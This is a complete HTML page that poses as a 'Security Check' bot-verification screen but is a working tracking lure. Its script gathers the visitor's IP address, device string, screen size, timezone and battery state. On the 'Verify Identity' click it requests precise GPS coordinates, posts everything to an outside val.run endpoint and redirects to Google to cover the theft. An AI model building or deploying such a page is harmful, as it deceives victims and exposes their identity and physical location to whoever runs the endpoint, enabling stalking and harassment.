<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>Security Check</title>
<style>
  body { background-color: #08080a; color: #ececf0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
  .loader { border: 3px solid #24242e; border-top: 3px solid #ffb03d; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  h2 { font-weight: 700; letter-spacing: 0.05em; margin-bottom: 5px; }
  p { color: #7a7a88; font-size: 14px; max-width: 300px; line-height: 1.5; margin-bottom: 20px; }
  .box { background: #101014; border: 1px solid #24242e; padding: 40px 20px; border-radius: 12px; width: 80%; max-width: 350px; }
  button { background: #ffb03d; color: #000; border: none; padding: 14px 24px; border-radius: 8px; font-weight: 800; font-size: 14px; font-family: inherit; letter-spacing: 0.05em; cursor: pointer; width: 100%; transition: 0.2s; }
  button:active { opacity: 0.7; transform: scale(0.98); }
</style>
</head>
<body>

<div class="box">
  <div class="loader" id="spin"></div>
  <h2 id="title">Verifying connection...</h2>
  <p id="desc">Please verify your identity to confirm you are human and not a bot.</p>
  <button id="verifyBtn" onclick="startTracking()">Verify Identity</button>
</div>

<script>
  let baseData = {};

  fetch("https://api.ipify.org?format=json").then(r => r.json()).then(ipData => {
      baseData = {
          ip: ipData.ip,
          device: navigator.userAgent,
          resolution: window.screen.width + "x" + window.screen.height,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          battery: "Unknown",
          gps: null
      };

      if (navigator.getBattery) {
          navigator.getBattery().then(function(battery) {
              baseData.battery = Math.round(battery.level * 100) + "%" + (battery.charging ? " (Charging)" : "");
          });
      }
  });

  function startTracking() {
      document.getElementById("desc").innerText = "Verifying... please wait.";
      document.getElementById("verifyBtn").style.display = "none";
      document.getElementById("spin").style.display = "block";

      if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
              (pos) => {
                  baseData.gps = pos.coords.latitude + "," + pos.coords.longitude;
                  sendData(baseData);
              },
              (err) => {
                  sendData(baseData);
              },
              { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
          );
      } else {
          sendData(baseData);
      }
  }

  function sendData(payload) {
      fetch("https://Opforge--8d359e98dca911f194261607ee4eb77e.web.val.run", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
      }).finally(() => {
          window.location.href = "https://www.google.com";
      });
  }
</script>
</body>
</html>
